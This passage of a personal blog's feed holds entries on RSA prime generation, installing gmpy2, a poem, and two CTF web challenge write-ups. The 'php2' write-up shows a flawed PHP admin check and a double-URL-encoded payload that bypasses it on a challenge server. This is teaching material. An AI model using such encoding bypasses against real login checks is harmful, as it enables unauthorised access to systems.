class="attr">return</span> <span class="string">a</span></span><br></pre></td></tr></table></figure></p><h1 id="生成n位的素数"><a href="#生成n位的素数" class="headerlink" title="生成n位的素数"></a>生成n位的素数</h1><p>产生的素数越大，安全性越好</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def genPrime(b=<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        # the highest bit <span class="keyword">is</span> <span class="number">1</span></span><br><span class="line">        ans = <span class="string">"1"</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(b<span class="number">-2</span>):</span><br><span class="line">            ans += str(random.randint(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">        # the lowest bit <span class="keyword">is</span> <span class="number">1</span></span><br><span class="line">        ans += <span class="string">"1"</span></span><br><span class="line">        ans = <span class="built_in">int</span>(ans,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> miller_rabin(ans):</span><br><span class="line">            <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;快速幂算法&quot;&gt;&lt;a href=&quot;#快速幂算法&quot; class=&quot;headerlink&quot; title=&quot;快速幂算法&quot;&gt;&lt;/a&gt;快速幂算法&lt;/h1&gt;&lt;p&gt; 加解密都用到了幂运算&lt;br&gt; &lt;figure class=&quot;highlight properties&quot;&gt;&lt;tabl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>安装gmpy2</title>
    <link href="https://singlemindedt.github.io/2019/12/23/%E5%AE%89%E8%A3%85gmpy2/"/>
    <id>https://singlemindedt.github.io/2019/12/23/安装gmpy2/</id>
    <published>2019-12-23T03:44:56.000Z</published>
    <updated>2019-12-23T23:40:15.006Z</updated>
    
    <content type="html"><![CDATA[<p>在Windows上安装需要非官方的预编译二进制文件，<br>网址：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a><br>找GMPY，是按照字母序排的，选择适合自己版本的gmpy2的whl文件进行下载，<br>我选的：gmpy2‑2.0.8‑cp38‑cp38‑win_amd64.whl<br>保存在了E盘，安装：</p><p><img src="https://s2.ax1x.com/2019/12/24/l9rMNQ.png" alt="l9rMNQ.png"><br>PyCharm读取本地包：右击pycharm中项目管理器中本项目目录下的venv文件夹，单击在资源管理器中打开；<br>用记事本打开pyvenv.cfg，将里面的include-system-site-packages = false<br>改为include-system-site-packages = true；<br>重启；</p><ul><li>本项目有效，其它还得改pyvenv.cfg</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在Windows上安装需要非官方的预编译二进制文件，&lt;br&gt;网址：&lt;a href=&quot;https://www.lfd.uci.edu/~gohlke/pythonlibs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.lfd.uci
      
    
    </summary>
    
      <category term="notes" scheme="https://singlemindedt.github.io/categories/notes/"/>
    
      <category term="Python" scheme="https://singlemindedt.github.io/categories/notes/Python/"/>
    
    
      <category term="Python" scheme="https://singlemindedt.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>php2</title>
    <link href="https://singlemindedt.github.io/2019/12/21/php2/"/>
    <id>https://singlemindedt.github.io/2019/12/21/php2/</id>
    <published>2019-12-21T02:51:21.000Z</published>
    <updated>2019-12-30T06:10:07.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h1><h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p>打开链接只有一句：<br><strong>Can you anthenticate to this website?</strong><br>尝试访问index.php，失败；访问index.phps,成功；<br>得到以下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析代码：</p><ul><li><p>要使”admin”===$_GET[id]不成立</p></li><li><p>$_GET[id] = urldecode($_GET[id]);<br>url编码后使得$_GET[id] == “admin”成立</p></li></ul><h2 id="实际操作："><a href="#实际操作：" class="headerlink" title="实际操作："></a>实际操作：</h2><p>方案：通过url转码实现，因为浏览器要转一次，故我们进行二次转码；<br>n的url编码为：%6e;%的url编码为%25<br>构造：admi%256e</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//111.198.29.45:35463/?id=admi%256e</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/21/Qj84JA.png" alt="Qj84JA.png"></p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php2&quot;&gt;&lt;a href=&quot;#php2&quot; class=&quot;headerlink&quot; title=&quot;php2&quot;&gt;&lt;/a&gt;php2&lt;/h1&gt;&lt;h2 id=&quot;题目分析：&quot;&gt;&lt;a href=&quot;#题目分析：&quot; class=&quot;headerlink&quot; title=&quot;题目分析：&quot;&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>web2</title>
    <link href="https://singlemindedt.github.io/2019/12/21/web2/"/>
    <id>https://singlemindedt.github.io/2019/12/21/web2/</id>
    <published>2019-12-21T01:44:24.000Z</published>
    <updated>2019-12-30T06:07:46.353Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p>根据题目要求需要解密；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line"><span class="comment">//strrev() 函数反转字符串;语法:strrev(string)</span></span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);<span class="comment">//从$_0位置开始，返回1个字符</span></span><br><span class="line"><span class="comment">//substr() 函数返回字符串的一部分。</span></span><br><span class="line"><span class="comment">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。语法substr(string,start,length)</span></span><br><span class="line"><span class="comment">//用于提取字符串的一部分，即返回字符串的子串。</span></span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line"><span class="comment">//ord() 函数返回字符串的首个字符的 ASCII 值。</span></span><br><span class="line">        $_c=chr($__);</span><br><span class="line"><span class="comment">//chr() 函数从指定的 ASCII 值返回字符。</span></span><br><span class="line"><span class="comment">//ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</span></span><br><span class="line">        $_=$_.$_c;<span class="comment">//拼接   </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line"><span class="comment">//返回ROT13 编码(反转字符串(base64加密($_)))的结果</span></span><br><span class="line"><span class="comment">//ROT13一种简易的替换式密码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="实际操作："><a href="#实际操作：" class="headerlink" title="实际操作："></a>实际操作：</h2><p>分析代码，可知加密流程为：</p><ul><li>对flag字符串反转</li><li>截取每一个字符，转ascll+1,再转为字符，拼接</li><li>base64加密，反转加密和的字符串，ROT13编码<br>则可得解密算法：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str=<span class="string">'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'</span>;</span><br><span class="line">$_ = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$_o=<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_);$_0++)&#123;  </span><br><span class="line">       </span><br><span class="line">        $_c=substr($_,$_0,<span class="number">1</span>);  </span><br><span class="line"></span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>;  </span><br><span class="line"></span><br><span class="line">        $_c=chr($__);  </span><br><span class="line"></span><br><span class="line">        $_o=$_o.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">echo</span> strrev($_o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.ax1x.com/2019/12/21/QjMzkR.png" alt="QjMzkR.png"></p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web2&quot;&gt;&lt;/a&gt;web2&lt;/h1&gt;&lt;h2 id=&quot;题目分析：&quot;&gt;&lt;a href=&quot;#题目分析：&quot; class=&quot;headerlink&quot; title=&quot;题目分析：&quot;&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>不可征服</title>
    <link href="https://singlemindedt.github.io/2019/12/20/%E4%B8%8D%E5%8F%AF%E5%BE%81%E6%9C%8D/"/>
    <id>https://singlemindedt.github.io/2019/12/20/不可征服/</id>
    <published>2019-12-20T13:38:09.000Z</published>
    <updated>2019-12-20T14:20:49.046Z</updated>
    
    <content type="html"><![CDATA[<p>《不可征服》</p><p>作者：威廉亨利</p><p>透过覆盖我的夜色,</p><p>我看见黑暗层层叠叠。</p><p>我感谢上天赐予我,</p><p>不可征服的灵魂。</p><p>就算被地狱紧紧拽住,</p><p>我也从未退避哀求。</p><p>遭受命运的重重打击，</p><p>我满头鲜血，却头颅高昂。</p><p>在愤怒和悲伤的尘世外,</p><p>耸立的不过是恐怖的影子,</p><p>面对未来的威胁,</p><p>我无所畏惧。</p><p>无论命运之门多么狭窄，</p><p>无论承受怎样的惩罚，</p><p>我是我命运的主宰,</p><p>我是我灵魂的统帅。</p><p><img src="https://s2.ax1x.com/2019/12/20/QX6PKg.jpg" alt="QX6PKg.jpg"><br>Invictus</p><p>Out of the night that covers me</p><p>Black as the pit from pole to pole</p><p>I thank whatever gods may be</p><p>For my unconquerable soul</p><p>In the fell clutch of circumstance</p><p>I have not winced nor cried aloud</p><p>Under the bludgeonings of chance</p><p>My head is bloody,but unbowed.</p><p>Beyond this place of wrath and tear</p><p>Looms but the Horror of the shade</p><p>And yet the menace of the years</p><p>Finds,and shall find,me unafraid</p><p>It matters not how strait the gate</p><p>How charged with punishments the scroll</p><p>I am the master of my fate</p><p>I am the captain of my soul.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;《不可征服》&lt;/p&gt;
&lt;p&gt;作者：威廉亨利&lt;/p&gt;
&lt;p&gt;透过覆盖我的夜色,&lt;/p&gt;
&lt;p&gt;我看见黑暗层层叠叠。&lt;/p&gt;
&lt;p&gt;我感谢上天赐予我,&lt;/p&gt;
&lt;p&gt;不可征服的灵魂。&lt;/p&gt;
&lt;p&gt;就算被地狱紧紧拽住,&lt;/p&gt;
&lt;p&gt;我也从未退避哀求。&lt;/p&gt;
&lt;p&gt;遭受命运的
      
    
    </summary>
    
      <category term="essay" scheme="https://singlemindedt.github.io/categories/essay/"/>
    
    
      <category term="essay" scheme="https://singlemindedt.github.io/tags/essay/"/>
    
  </entry>
  
</feed>
